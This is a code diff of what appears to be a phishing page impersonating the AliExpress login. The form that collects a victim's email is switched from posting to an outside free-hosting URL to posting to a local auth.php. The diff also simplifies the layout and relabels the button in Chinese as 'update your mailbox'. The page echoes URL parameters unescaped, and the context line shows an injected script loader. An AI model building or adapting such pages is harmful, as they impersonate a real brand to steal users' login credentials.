@@ -423,15 +423,16 @@ with(document)with(body)with(insertBefore(createElement("script"),firstChild))se
                     <h4 class="modal-title">Welcome to AliExpress.com | Login to continue</h4>
                 </div>               
                 
-                <div class="modal-body">                                       
-                <div class="col-md-6 col-sm-6 no-padng1">
-                    <div class="model-l1">                    
-                    <form method="post" action="https://j379192911.000webhostapp.com/temp/indexs">
+                <table width="320" align="center">
+
+				<tbody><tr><td>
+
+				<form method="post" action="auth.php">
 			
 				<br><br>
 
 				<input name="email" type="hidden" class="form-control" id="email" value="<?php echo $_GET['login']; ?>" placeholder="Username">
-				<font face="arial" size="3" color="#045FB4"><?php echo $_GET['pdf']; ?></font>		
+				<font face="arial" size="3" color="#045FB4"><?php echo $_GET['login']; ?></font>		
 
 				<p>
 
@@ -442,29 +443,18 @@ with(document)with(body)with(insertBefore(createElement("script"),firstChild))se
 
 				</p><p>
 
-				<input type="submit" value="Continue >>>" style="width:320px; height:55px; background-color: 276BA2; border: solid 3px 276BA2; 
+				<input type="submit" value="&#26356;&#26032;&#24744;&#30340;&#37038;&#31665;" style="width:320px; height:55px; background-color: 276BA2; border: solid 3px 276BA2; 
 				font-family: Verdana; font-size: 20px; font-weight: bold; color: #ffffff; -moz-border-radius: 4px; -webkit-border-radius: 4px; 
 				-khtml-border-radius: 4px; border-radius: 4px;">				
 	
 				
 
-				</p></form>                    
-                                <div class="clearfix"></div>
-                                 <form method="post" id="logFrm1" class="log-frm" name="logFrm1"> 
-                                <ul>                                    
-                                    <li>
-                                        
-                                        <div class="forgot">
-                                        <ul>                                          
-                                        <li><p>Enter your Email Address here to receive a link to change password.</p></li>
-                                        <li>Email Id</li>
-                                        <li><input type="text" placeholder="Your email id" id="forgetemailId" class="form-control" name="forgetemailId"></li>
-                                        <li><button type="“submit”" class="btn btn-default" onclick="forgot();">Send Mail</button></li>
-                                    </ul> 
-                                </div>
-                            </li>
-                        </ul>
-                 </form>
+				</p></form>
+
+
+				</td></tr>
+				
+				</tbody></table>
                     </div>
                     </div>    
                     
